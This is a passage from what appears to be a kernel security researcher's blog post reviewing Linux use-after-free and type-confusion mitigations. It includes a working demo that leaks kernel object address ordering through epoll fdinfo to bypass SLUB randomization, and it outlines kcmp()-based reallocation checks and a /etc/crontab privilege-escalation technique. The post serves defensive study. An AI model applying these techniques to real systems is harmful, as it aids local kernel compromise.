&lt;code&gt;panic_on_oops&lt;/code&gt; might be too drastic there.&lt;/p&gt;\n&lt;p&gt;A good solution to this might require a more fine-grained approach. (For example, grsecurity has for a long time had the ability to lock out specific UIDs that have caused crashes.) Perhaps it would make sense to allow the &lt;code&gt;init&lt;/code&gt; daemon to use different policies for crashes in different services/sessions/UIDs?&lt;/p&gt;\n&lt;h2&gt;Against UAF access: Deterministic UAF mitigation&lt;/h2&gt;\n&lt;p&gt;One defense that would reliably stop an exploit for this issue would be a deterministic use-after-free mitigation. Such a mitigation would reliably protect the memory formerly occupied by the object from accesses through dangling pointers to the object, at least once the memory has been reused for a different purpose (including reuse to store heap metadata). For write operations, this probably requires either atomicity of the access check and the actual write or an RCU-like delayed freeing mechanism. For simple read operations, it can also be implemented by ordering the access check after the read, but before the read value is used.&lt;/p&gt;\n&lt;p&gt;A big downside of this approach on its own is that extra checks on every memory access will probably come with an extremely high efficiency penalty, especially if the mitigation can not make any assumptions about what kinds of parallel accesses might be happening to an object, or what semantics pointers have. (The proof-of-concept implementation I presented at LSSNA 2020 (&lt;a href=\"https://static.sched.com/hosted_files/lssna2020/0b/LSSNA_2020_Jann_Horn_UAF_Mitigation.pdf\"&gt;slides&lt;/a&gt;, &lt;a href=\"https://www.youtube.com/watch?v=uE1w0Mxldwk\"&gt;recording&lt;/a&gt;) had CPU overhead roughly in the range 60%-159% in kernel-heavy benchmarks, and ~8% for a very userspace-heavy benchmark.)&lt;/p&gt;\n&lt;p&gt;Unfortunately, even a deterministic use-after-free mitigation often won't be enough to deterministically limit the blast radius of something like a refcounting mistake to the object in which it occurred. Consider a case where two codepaths concurrently operate on the same object: Codepath A assumes that the object is live and subject to normal locking rules. Codepath B knows that the reference count reached zero, assumes that it therefore has exclusive access to the object (meaning all members are mutable without any locking requirements), and is trying to tear down the object. Codepath B might then start dropping references the object was holding on other objects while codepath A is following the same references. This could then lead to use-after-frees on pointed-to objects. If all data structures are subject to the same mitigation, this might not be too much of a problem; but if some data structures (like &lt;code&gt;struct page&lt;/code&gt;) are not protected, it might permit a mitigation bypass.&lt;/p&gt;\n&lt;p&gt;Similar issues apply to data structures with &lt;code&gt;union&lt;/code&gt; members that are used in different object states; for example, here's some random kernel data structure with an &lt;code&gt;rcu_head&lt;/code&gt; in a &lt;code&gt;union&lt;/code&gt; (just a random example, there isn't anything wrong with this code as far as I know):&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;struct allowedips_node {\n    struct wg_peer __rcu *peer;\n    struct allowedips_node __rcu *bit[2];\n    /* While it may seem scandalous that we waste space for v4,\n     * we're alloc'ing to the nearest power of 2 anyway, so this\n     * doesn't actually make a difference.\n     */\n    u8 bits[16] __aligned(__alignof(u64));\n    u8 cidr, bit_at_a, bit_at_b, bitlen;\n\n    /* Keep rarely used list at bottom to be beyond cache line. */\n    union {\n        struct list_head peer_list;\n        struct rcu_head rcu;\n    };\n};\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;As long as everything is working properly, the &lt;code&gt;peer_list&lt;/code&gt; member is only used while the object is live, and the &lt;code&gt;rcu&lt;/code&gt; member is only used after the object has been scheduled for delayed freeing; so this code is completely fine. But &lt;em&gt;if&lt;/em&gt; a bug somehow caused the &lt;code&gt;peer_list&lt;/code&gt; to be read after the &lt;code&gt;rcu&lt;/code&gt; member has been initialized, type confusion would result.&lt;/p&gt;\n&lt;p&gt;In my opinion, this demonstrates that while UAF mitigations do have a lot of value (and would have reliably prevented exploitation of this specific bug), &lt;strong&gt;a use-after-free is just one possible consequence of the symptom class \"object state confusion\"&lt;/strong&gt; (which may or may not be the same as the bug class of the root cause). It would be even better to enforce rules on object states, and ensure that an object e.g. can't be accessed through a \"refcounted\" reference anymore after the refcount has reached zero and has logically transitioned into a state like \"non-RCU members are exclusively owned by thread performing teardown\" or \"RCU callback pending, non-RCU members are uninitialized\" or \"exclusive access to RCU-protected members granted to thread performing teardown, other members are uninitialized\". Of course, doing this as a runtime mitigation would be even costlier and messier than a reliable UAF mitigation; this level of protection is probably only realistic with at least some level of annotations and static validation.&lt;/p&gt;\n&lt;h2&gt;Against UAF access: Probabilistic UAF mitigation; pointer leaks&lt;/h2&gt;\n&lt;p&gt;&lt;strong&gt;Summary: Some types of probabilistic UAF mitigation break if the attacker can leak information about pointer values; and information about pointer values easily leaks to userspace, e.g. through pointer comparisons in map/set-like structures.&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;If a deterministic UAF mitigation is too costly, an alternative is to do it probabilistically; for example, by tagging pointers with a small number of bits that are checked against object metadata on access, and then changing that object metadata when objects are freed.&lt;/p&gt;\n&lt;p&gt;The downside of this approach is that information leaks can be used to break the protection. One example of a type of information leak that I'd like to highlight (without any judgment on the relative importance of this compared to other types of information leaks) are intentional pointer comparisons, which have quite a few facets.&lt;/p&gt;\n&lt;p&gt;A relatively straightforward example where this could be an issue is the &lt;a href=\"https://man7.org/linux/man-pages/man2/kcmp.2.html\"&gt;&lt;code&gt;kcmp()&lt;/code&gt;&lt;/a&gt; syscall. This syscall compares two kernel objects using an arithmetic comparison of their permuted pointers (using a per-boot randomized permutation, see &lt;code&gt;kptr_obfuscate()&lt;/code&gt;) and returns the result of the comparison (smaller, equal or greater). This gives userspace a way to order handles to kernel objects (e.g. file descriptors) based on the identities of those kernel objects (e.g. &lt;code&gt;struct file&lt;/code&gt; instances), which in turn allows userspace to group a set of such handles by backing kernel object in &lt;code&gt;O(n*log(n))&lt;/code&gt; time using a standard sorting algorithm.&lt;/p&gt;\n&lt;p&gt;This syscall can be abused for improving the reliability of use-after-free exploits against some struct types because it checks whether two pointers to kernel objects are equal without accessing those objects: An attacker can allocate an object, somehow create a reference to the object that is not counted properly, free the object, reallocate it, and then verify whether the reallocation indeed reused the same address by comparing the dangling reference and a reference to the new object with &lt;code&gt;kcmp()&lt;/code&gt;. If &lt;code&gt;kcmp()&lt;/code&gt; includes the pointer's tag bits in the comparison, this would likely also permit breaking probabilistic UAF mitigations.&lt;/p&gt;\n&lt;p&gt;Essentially the same concern applies when a kernel pointer is encrypted and then given to userspace in &lt;code&gt;fuse_lock_owner_id()&lt;/code&gt;, which encrypts the pointer to a &lt;code&gt;files_struct&lt;/code&gt; with an open-coded version of &lt;a href=\"https://en.wikipedia.org/wiki/XTEA\"&gt;XTEA&lt;/a&gt; before passing it to a FUSE daemon.&lt;/p&gt;\n&lt;p&gt;In both these cases, explicitly stripping tag bits would be an acceptable workaround because a pointer without tag bits still uniquely identifies a memory location; and given that these are very special interfaces that intentionally expose some degree of information about kernel pointers to userspace, it would be reasonable to adjust this code manually.&lt;/p&gt;\n&lt;p&gt;A somewhat more interesting example is the behavior of this piece of userspace code:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;#define _GNU_SOURCE\n#include &amp;lt;sys/epoll.h&amp;gt;\n#include &amp;lt;sys/eventfd.h&amp;gt;\n#include &amp;lt;sys/resource.h&amp;gt;\n#include &amp;lt;err.h&amp;gt;\n#include &amp;lt;stdio.h&amp;gt;\n#include &amp;lt;stdlib.h&amp;gt;\n#include &amp;lt;unistd.h&amp;gt;\n#include &amp;lt;sched.h&amp;gt;\n\n#define SYSCHK(x) ({          \\\n  typeof(x) __res = (x);      \\\n  if (__res == (typeof(x))-1) \\\n    err(1, \"SYSCHK(\" #x \")\"); \\\n  __res;                      \\\n})\n\nint main(void) {\n  struct rlimit rlim;\n  SYSCHK(getrlimit(RLIMIT_NOFILE, &amp;amp;rlim));\n  rlim.rlim_cur = rlim.rlim_max;\n  SYSCHK(setrlimit(RLIMIT_NOFILE, &amp;amp;rlim));\n\n  cpu_set_t cpuset;\n  CPU_ZERO(&amp;amp;cpuset);\n  CPU_SET(0, &amp;amp;cpuset);\n  SYSCHK(sched_setaffinity(0, sizeof(cpuset), &amp;amp;cpuset));\n\n  int epfd = SYSCHK(epoll_create1(0));\n  for (int i=0; i&amp;lt;1000; i++)\n    SYSCHK(eventfd(0, 0));\n  for (int i=0; i&amp;lt;192; i++) {\n    int fd = SYSCHK(eventfd(0, 0));\n    struct epoll_event event = {\n      .events = EPOLLIN,\n      .data = { .u64 = i }\n    };\n    SYSCHK(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;amp;event));\n  }\n\n  char cmd[100];\n  sprintf(cmd, \"cat /proc/%d/fdinfo/%d\", getpid(), epfd);\n  system(cmd);\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;It first creates a ton of eventfds that aren't used. Then it creates a bunch more eventfds and creates epoll watches for them, in creation order, with a monotonically incrementing counter in the \"data\" field. Afterwards, it asks the kernel to print the current state of the epoll instance, which comes with a list of all registered epoll watches, including the value of the &lt;code&gt;data&lt;/code&gt; member (in hex). But how is this list sorted? Here's the result of running that code in a Ubuntu 20.10 VM (truncated, because it's a bit long):&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;user@ubuntuvm:~/epoll_fdinfo$ ./epoll_fdinfo \npos:    0\nflags:  02\nmnt_id: 14\ntfd:     1040 events:       19 data:               24  pos:0 ino:2f9a sdev:d\ntfd:     1050 events:       19 data:               2e  pos:0 ino:2f9a sdev:d\ntfd:     1024 events:       19 data:               14  pos:0 ino:2f9a sdev:d\ntfd:     1029 events:       19 data:               19  pos:0 ino:2f9a sdev:d\ntfd:     1048 events:       19 data:               2c  pos:0 ino:2f9a sdev:d\ntfd:     1042 events:       19 data:               26  pos:0 ino:2f9a sdev:d\ntfd:     1026 events:       19 data:               16  pos:0 ino:2f9a sdev:d\ntfd:     1033 events:       19 data:               1d  pos:0 ino:2f9a sdev:d\n[...]\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;The &lt;code&gt;data:&lt;/code&gt; field here is the loop index we stored in the &lt;code&gt;.data&lt;/code&gt; member, formatted as hex. Here is the complete list of the &lt;code&gt;data&lt;/code&gt; values in decimal:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;36, 46, 20, 25, 44, 38, 22, 29, 30, 45, 33, 28, 41, 31, 23, 37, 24, 50, 32, 26, 21, 43, 35, 48, 27, 39, 40, 47, 42, 34, 49, 19, 95, 105, 111, 84, 103, 97, 113, 88, 89, 104, 92, 87, 100, 90, 114, 96, 83, 109, 91, 85, 112, 102, 94, 107, 86, 98, 99, 106, 101, 93, 108, 110, 12, 1, 14, 5, 6, 9, 4, 17, 7, 13, 0, 8, 2, 11, 3, 15, 16, 18, 10, 135, 145, 119, 124, 143, 137, 121, 128, 129, 144, 132, 127, 140, 130, 122, 136, 123, 117, 131, 125, 120, 142, 134, 115, 126, 138, 139, 146, 141, 133, 116, 118, 66, 76, 82, 55, 74, 68, 52, 59, 60, 75, 63, 58, 71, 61, 53, 67, 54, 80, 62, 56, 51, 73, 65, 78, 57, 69, 70, 77, 72, 64, 79, 81, 177, 155, 161, 166, 153, 147, 163, 170, 171, 154, 174, 169, 150, 172, 164, 178, 165, 159, 173, 167, 162, 152, 176, 157, 168, 148, 149, 156, 151, 175, 158, 160, 186, 188, 179, 180, 183, 191, 181, 187, 182, 185, 189, 190, 184\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;While these look sort of random, you can see that the list can be split into blocks of length 32 that consist of shuffled contiguous sequences of numbers:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;Block 1 (32 values in range 19-50):\n36, 46, 20, 25, 44, 38, 22, 29, 30, 45, 33, 28, 41, 31, 23, 37, 24, 50, 32, 26, 21, 43, 35, 48, 27, 39, 40, 47, 42, 34, 49, 19\n\nBlock 2 (32 values in range 83-114):\n95, 105, 111, 84, 103, 97, 113, 88, 89, 104, 92, 87, 100, 90, 114, 96, 83, 109, 91, 85, 112, 102, 94, 107, 86, 98, 99, 106, 101, 93, 108, 110\n\nBlock 3 (19 values in range 0-18):\n12, 1, 14, 5, 6, 9, 4, 17, 7, 13, 0, 8, 2, 11, 3, 15, 16, 18, 10\n\nBlock 4 (32 values in range 115-146):\n135, 145, 119, 124, 143, 137, 121, 128, 129, 144, 132, 127, 140, 130, 122, 136, 123, 117, 131, 125, 120, 142, 134, 115, 126, 138, 139, 146, 141, 133, 116, 118\n\nBlock 5 (32 values in range 51-82):\n66, 76, 82, 55, 74, 68, 52, 59, 60, 75, 63, 58, 71, 61, 53, 67, 54, 80, 62, 56, 51, 73, 65, 78, 57, 69, 70, 77, 72, 64, 79, 81\n\nBlock 6 (32 values in range 147-178):\n177, 155, 161, 166, 153, 147, 163, 170, 171, 154, 174, 169, 150, 172, 164, 178, 165, 159, 173, 167, 162, 152, 176, 157, 168, 148, 149, 156, 151, 175, 158, 160\n\nBlock 7 (13 values in range 179-191):\n186, 188, 179, 180, 183, 191, 181, 187, 182, 185, 189, 190, 184\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;What's going on here becomes clear when you look at the data structures &lt;code&gt;epoll&lt;/code&gt; uses internally. &lt;code&gt;ep_insert&lt;/code&gt; calls &lt;code&gt;ep_rbtree_insert&lt;/code&gt; to insert a &lt;code&gt;struct epitem&lt;/code&gt; into a red-black tree (a type of sorted binary tree); and this red-black tree is sorted using a tuple of a &lt;code&gt;struct file *&lt;/code&gt; and a file descriptor number:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;/* Compare RB tree keys */\nstatic inline int ep_cmp_ffd(struct epoll_filefd *p1,\n                             struct epoll_filefd *p2)\n{\n        return (p1-&amp;gt;file &amp;gt; p2-&amp;gt;file ? +1:\n                (p1-&amp;gt;file &amp;lt; p2-&amp;gt;file ? -1 : p1-&amp;gt;fd - p2-&amp;gt;fd));\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;So the values we're seeing have been ordered based on the virtual address of the corresponding &lt;code&gt;struct file&lt;/code&gt;; and SLUB allocates &lt;code&gt;struct file&lt;/code&gt; from order-1 pages (i.e. pages of size 8 KiB), which can hold 32 objects each:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;root@ubuntuvm:/sys/kernel/slab/filp# cat order \n1\nroot@ubuntuvm:/sys/kernel/slab/filp# cat objs_per_slab \n32\nroot@ubuntuvm:/sys/kernel/slab/filp# \n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;This explains the grouping of the numbers we saw: Each block of 32 contiguous values corresponds to an order-1 page that was previously empty and is used by SLUB to allocate objects until it becomes full.&lt;/p&gt;\n&lt;p&gt;With that knowledge, we can transform those numbers a bit, to show the order in which objects were allocated inside each page (excluding pages for which we haven't seen all allocations):&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;$ cat slub_demo.py \n#!/usr/bin/env python3\nblocks = [\n  [ 36, 46, 20, 25, 44, 38, 22, 29, 30, 45, 33, 28, 41, 31, 23, 37, 24, 50, 32, 26, 21, 43, 35, 48, 27, 39, 40, 47, 42, 34, 49, 19 ],\n  [ 95, 105, 111, 84, 103, 97, 113, 88, 89, 104, 92, 87, 100, 90, 114, 96, 83, 109, 91, 85, 112, 102, 94, 107, 86, 98, 99, 106, 101, 93, 108, 110 ],\n  [ 12, 1, 14, 5, 6, 9, 4, 17, 7, 13, 0, 8, 2, 11, 3, 15, 16, 18, 10 ],\n  [ 135, 145, 119, 124, 143, 137, 121, 128, 129, 144, 132, 127, 140, 130, 122, 136, 123, 117, 131, 125, 120, 142, 134, 115, 126, 138, 139, 146, 141, 133, 116, 118 ],\n  [ 66, 76, 82, 55, 74, 68, 52, 59, 60, 75, 63, 58, 71, 61, 53, 67, 54, 80, 62, 56, 51, 73, 65, 78, 57, 69, 70, 77, 72, 64, 79, 81 ],\n  [ 177, 155, 161, 166, 153, 147, 163, 170, 171, 154, 174, 169, 150, 172, 164, 178, 165, 159, 173, 167, 162, 152, 176, 157, 168, 148, 149, 156, 151, 175, 158, 160 ],\n  [ 186, 188, 179, 180, 183, 191, 181, 187, 182, 185, 189, 190, 184 ]\n]\n\nfor alloc_indices in blocks:\n  if len(alloc_indices) != 32:\n    continue\n  # indices of allocations ('data'), sorted by memory location, shifted to be relative to the block\n  alloc_indices_relative = [position - min(alloc_indices) for position in alloc_indices]\n  # reverse mapping: memory locations of allocations,\n  # sorted by index of allocation ('data').\n  # if we've observed all allocations in a page,\n  # these will really be indices into the page.\n  memory_location_by_index = [alloc_indices_relative.index(idx) for idx in range(0, len(alloc_indices))]\n  print(memory_location_by_index)\n$ ./slub_demo.py \n[31, 2, 20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17]\n[16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17, 31, 2, 20, 6, 14]\n[23, 30, 17, 31, 2, 20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27]\n[20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17, 31, 2]\n[5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17, 31, 2, 20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15]\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;And these sequences are almost the same, except that they have been rotated around by different amounts. This is exactly the SLUB freelist randomization scheme, as introduced in &lt;a href=\"https://git.kernel.org/linus/210e7a43fa905\"&gt;commit 210e7a43fa905&lt;/a&gt;!&lt;/p&gt;\n&lt;p&gt;When a SLUB &lt;code&gt;kmem_cache&lt;/code&gt; is created (an instance of the SLUB allocator for a specific size class and potentially other specific attributes, usually initialized at boot time), &lt;code&gt;init_cache_random_seq&lt;/code&gt; and &lt;code&gt;cache_random_seq_create&lt;/code&gt; fill an array &lt;code&gt;-&amp;gt;random_seq&lt;/code&gt; with randomly-ordered object indices via Fisher-Yates shuffle, with the array length equal to the number of objects that fit into a page. Then, whenever SLUB grabs a new page from the lower-level page allocator, it initializes the page freelist using the indices from &lt;code&gt;-&amp;gt;random_seq&lt;/code&gt;, starting at a random index in the array (and wrapping around when the end is reached). (I'm ignoring the low-order allocation fallback here.)&lt;/p&gt;\n&lt;p&gt;So in summary, we can bypass SLUB randomization for the slab from which &lt;code&gt;struct file&lt;/code&gt; is allocated because someone used it as a lookup key in a specific type of data structure. This is already fairly undesirable if SLUB randomization is supposed to provide protection against some types of local attacks for all slabs.&lt;/p&gt;\n&lt;p&gt;The heap-randomization-weakening effect of such data structures is not necessarily limited to cases where elements of the data structure can be listed in-order by userspace: If there was a codepath that iterated through the tree in-order and freed all tree nodes, that could have a similar effect, because the objects would be placed on the allocator's freelist sorted by address, cancelling out the randomization. In addition, you might be able to leak information about iteration order through cache side channels or such.&lt;/p&gt;\n&lt;p&gt;If we introduce a probabilistic use-after-free mitigation that relies on attackers not being able to learn whether the uppermost bits of an object's address changed after it was reallocated, this data structure could also break that. This case is messier than things like &lt;code&gt;kcmp()&lt;/code&gt; because here the address ordering leak stems from a standard data structure.&lt;/p&gt;\n&lt;p&gt;You may have noticed that some of the examples I'm using here would be more or less limited to cases where an attacker is reallocating memory &lt;em&gt;with the same type as the old allocation&lt;/em&gt;, while a typical use-after-free attack ends up replacing an object with a differently-typed one to cause type confusion. As an example of a bug that can be exploited for privilege escalation without type confusion at the C structure level, see &lt;a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=808\"&gt;entry 808 in our bugtracker&lt;/a&gt;. My exploit for that bug first starts a &lt;code&gt;writev()&lt;/code&gt; operation on a writable file, lets the kernel validate that the file is indeed writable, then replaces the &lt;code&gt;struct file&lt;/code&gt; with a read-only &lt;code&gt;file&lt;/code&gt; pointing to &lt;code&gt;/etc/crontab&lt;/code&gt;, and lets &lt;code&gt;writev()&lt;/code&gt; continue. This allows gaining root privileges through a use-after-free bug without having to mess around with kernel pointers, data structure layouts, ROP, or anything like that. Of course that approach doesn't work with every use-after-free though.&lt;/p&gt;\n&lt;p&gt;(By the way: For an example of pointer leaks through container data structures in a JavaScript engine, see &lt;a href=\"https://thejh.net/misc/firefox-cve-2016-9904-and-cve-2017-5378-bugreport\"&gt;this bug I reported to Firefox back in 2016, when I wasn't a Google employee&lt;/a&gt;, which leaks the low 32 bits of a pointer by timing operations on pessimal hash tables - basically turning the HashDoS attack into an infoleak. Of course, nowadays, a side-channel-based pointer leak in a JS engine would probably not be worth treating as a security bug anymore, since you can probably get the same result with Spectre...)&lt;/p&gt;\n&lt;h2&gt;Against freeing SLUB pages: Preventing virtual address reuse beyond the slab&lt;/h2&gt;\n&lt;p&gt;(Also discussed a little bit on the kernel-hardening list in &lt;a href=\"https://lore.kernel.org/kernel-hardening/20201006004414.GP20115@casper.infradead.org/\"&gt;this thread&lt;/a&gt;.)&lt;/p&gt;\n&lt;p&gt;A weaker but less CPU-intensive alternative to trying to provide complete use-after-free protection for individual objects would be to ensure that &lt;em&gt;virtual&lt;/em&gt; addresses that have been used for slab memory are never reused outside the slab, but that physical pages can still be reused. This would be the same basic approach as used by &lt;a href=\"https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md#security\"&gt;PartitionAlloc&lt;/a&gt; and others. In kernel terms, that would essentially mean serving SLUB allocations from vmalloc space.&lt;/p&gt;\n&lt;p&gt;Some challenges I can think of with this approach are:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;SLUB allocations are currently served from the linear mapping, which normally uses hugepages; if vmalloc mappings with 4K PTEs were used instead, TLB pressure might increase, which might lead to some performance degradation.&lt;/li&gt;\n&lt;li&gt;To be able to use SLUB allocations in contexts that operate directly on physical memory, it is sometimes necessary for SLUB pages to be physically contiguous. That's not really a problem, but it is different from default vmalloc behavior. (Sidenote: DMA buffers don't always have to be physically contiguous - if you have an IOMMU, you can use that to map discontiguous pages to a contiguous DMA address range, just like how normal page tables create virtually-contiguous memory. See &lt;a href=\"https://git.kernel.org/linus/7d5b5738d151\"&gt;this kernel-internal API&lt;/a&gt; for an example that makes use of this, and &lt;a href=\"https://fuchsia.dev/fuchsia-src/concepts/drivers/driver_development/dma\"&gt;Fuchsia's documentation&lt;/a&gt; for a high-level overview of how all this works in general.)&lt;/li&gt;\n&lt;li&gt;Some parts of the kernel convert back and forth between virtual addresses, &lt;code&gt;struct page&lt;/code&gt; pointers, and (for interaction with hardware) physical addresses. This is a relatively straightforward mapping for addresses in the linear mapping, but would become a bit more complicated for vmalloc addresses. In particular, &lt;code&gt;page_to_virt()&lt;/code&gt; and &lt;code&gt;phys_to_virt()&lt;/code&gt; would have to be adjusted.\n&lt;ul&gt;\n&lt;li&gt;This is probably also going to be an issue for things like Memory Tagging, since pointer tags will have to be reconstructed when converting back to a virtual address. Perhaps it would make sense to forbid these helpers outside low-level memory management, and change existing users to instead keep a normal pointer to the allocation around? Or maybe you could let pointers to &lt;code&gt;struct page&lt;/code&gt; carry the tag bits for the corresponding virtual address in unused/ignored address bits?&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;The probability that this defense can prevent UAFs from leading to exploitable type confusion depends somewhat on the granularity of slabs; if specific struct types have their own slabs, it provides more protection than if objects are only grouped by size. So to improve the utility of virtually-backed slab memory, it would be necessary to replace the generic kmalloc slabs (which contain various objects, grouped only by size) with ones that are segregated by type and/or allocation site. (The grsecurity/PaX folks have vaguely alluded to doing something roughly along these lines using compiler instrumentation.)&lt;/p&gt;\n&lt;h2&gt;After reallocation as pagetable: Structure layout randomization&lt;/h2&gt;\n&lt;p&gt;Memory safety issues are often exploited in a way that involves creating a type confusion; e.g. exploiting a use-after-free by replacing the freed object with a new object of a different type.&lt;/p&gt;\n&lt;p&gt;A defense that first appeared in grsecurity/PaX is to shuffle the order of struct members at build time to make it harder to exploit type confusions involving structs; the upstream Linux version of this is in &lt;a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/scripts/gcc-plugins/randomize_layout_plugin.c\"&gt;scripts/gcc-plugins/randomize_layout_plugin.c&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;How effective this is depends partly on whether the attacker is forced to exploit the issue as a confusion between two structs, or whether the attacker can instead exploit it as a confusion between a struct and an array (e.g. containing characters, pointers or PTEs). Especially if only a single struct member is accessed, a struct-array confusion might still be viable by spraying the entire array with identical elements. Against the type confusion described in this blogpost (between &lt;code&gt;struct pid&lt;/code&gt; and page table entries), structure layout randomization could still be somewhat effective, since the reference count is half the size of a PTE and therefore can randomly be placed to overlap either the lower or the upper half of a PTE. (Except that the upstream Linux version of randstruct only randomizes explicitly-marked structs or structs containing only function pointers, and &lt;code&gt;struct pid&lt;/code&gt; has no such marking.)&lt;/p&gt;\n&lt;p&gt;Of course, drawing a clear distinction between structs and arrays oversimplifies things a bit; for example, there might be struct types that have a large number of pointers of the same type or attacker-controlled values, not unlike an array.&lt;/p&gt;\n&lt;p&gt;&lt;em&gt;If&lt;/em&gt; the attacker can not completely sidestep structure layout randomization by spraying the entire struct, the level of protection depends on how kernel builds are distributed:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;If the builds are created centrally by one vendor and distributed to a large number of users, an attacker who wants to be able to compromise users of this vendor would have to rework their exploit to use a different type confusion for each release, which may force the attacker to rewrite significant chunks of the exploit.&lt;/li&gt;\n&lt;li&gt;If the kernel is individually built per machine (or similar), and the kernel image is kept secret, an attacker who wants to reliably exploit a target system may be forced to somehow leak information about some structure layouts and either prepare exploits for many different possible struct layouts in advance or write parts of the exploit interactively after leaking information from the target system.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;To maximize the benefit of structure layout randomization in an environment where kernels are built centrally by a distribution/vendor, it would be necessary to make randomization a boot-time process by making structure offsets relocatable. (Or install-time, but that would break code signing.) Doing this cleanly (for example, such that 8-bit and 16-bit immediate displacements can still be used for struct member access where possible) would probably require a lot of fiddling with compiler internals, from the C frontend all the way to the emission of relocations. A somewhat hacky version of this approach already exists for C-&amp;gt;BPF compilation as &lt;a href=\"https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html\"&gt;BPF CO-RE&lt;/a&gt;, using the clang builtin &lt;a href=\"https://clang.llvm.org/docs/LanguageExtensions.html#builtin-preserve-access-index\"&gt;&lt;code&gt;__builtin_preserve_access_index&lt;/code&gt;&lt;/a&gt;, but that relies on debuginfo, which probably isn't a very clean approach.&lt;/p&gt;\n&lt;p&gt;Potential issues with structure layout randomization are:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;If structures are hand-crafted to be particularly cache-efficient, fully randomizing structure layout could worsen cache behavior. The existing randstruct implementation optionally avoids this by trying to randomize only within a cache line.&lt;/li&gt;\n&lt;li&gt;Unless the randomization is applied in a way that is reflected in DWARF debug info and such (&lt;a href=\"https://gcc.gnu.org/bugzilla/show_bug.cgi?id=84052\"&gt;which it isn't in the existing GCC-based implementation&lt;/a&gt;), it can make debugging and introspection harder.&lt;/li&gt;\n&lt;li&gt;It can break code that makes assumptions about structure layout; but such code is gross and should be cleaned up anyway (and Gustavo Silva &lt;a href=\"https://github.com/KSPP/linux/issues/109\"&gt;has been working&lt;/a&gt; on fixing some of those issues).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;While structure layout randomization by itself is limited in its effectiveness by struct-array confusions, it might be more reliable in combination with limited heap partitioning: If the heap is partitioned such that only struct-struct confusion is possible, and structure layout randomization makes struct-struct confusion difficult to exploit, and no struct in the same heap partition has array-like properties, then it would probably become much harder to directly exploit a UAF as type confusion. On the other hand, if the heap is already partitioned like that, it might make more sense to go all the way with heap partitioning and create one partition per type instead of dealing with all the hassle of structure layout randomization.&lt;/p&gt;\n&lt;p&gt;(By the way, if structure layouts are randomized, padding should probably also be randomized explicitly instead of always being on the same side to maximally randomize structure members with low alignment; see &lt;a href=\"https://lore.kernel.org/kernel-hardening/CAG48ez1Mr1FNCDGFscVg0SpuuA_Z4tn=WJhEqJVWW1rOuRiG2w@mail.gmail.com/\"&gt;my list post on this topic&lt;/a&gt; for details.)&lt;/p&gt;\n&lt;h2&gt;Control Flow Integrity&lt;/h2&gt;\n&lt;p&gt;&lt;strong&gt;I want to explicitly point out that kernel Control Flow Integrity would have had no impact at all on this exploit strategy&lt;/strong&gt;. By using a data-only strategy, we avoid having to leak addresses, avoid having to find ROP gadgets for a specific kernel build, and are completely unaffected by any defenses that attempt to protect kernel code or kernel control flow. Things like getting access to arbitrary files, increasing the privileges of a process, and so on don't require kernel instruction pointer control.&lt;/p&gt;\n&lt;p&gt;Like in &lt;a href=\"https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html\"&gt;my last blogpost on Linux kernel exploitation&lt;/a&gt; (which was about a buggy subsystem that an Android vendor added to their downstream kernel), to me, a data-only approach to exploitation feels very natural and seems less messy than trying to hijack control flow anyway.&lt;/p&gt;\n&lt;p&gt;Maybe things are different for userspace code; but for attacks by userspace against the kernel, I don't currently see a lot of utility in CFI because it typically only affects one of many possible methods for exploiting a bug. (Although of course there could be specific cases where a bug can only be exploited by hijacking control flow, e.g. if a type confusion only permits overwriting a function pointer and none of the permitted callees make assumptions about input types or privileges that could be broken by changing the function pointer.)&lt;/p&gt;\n&lt;h2&gt;Making important data readonly&lt;/h2&gt;\n&lt;p&gt;A defense idea that has shown up in a bunch of places (including Samsung phone kernels and XNU kernels for iOS) is to make data that is crucial to kernel security read-only except when it is intentionally being written to - the idea being that even if an attacker has an arbitrary memory write, they should not be able to directly overwrite specific pieces of data that are of exceptionally high importance to system security, such as credential structures, page tables, or &lt;a 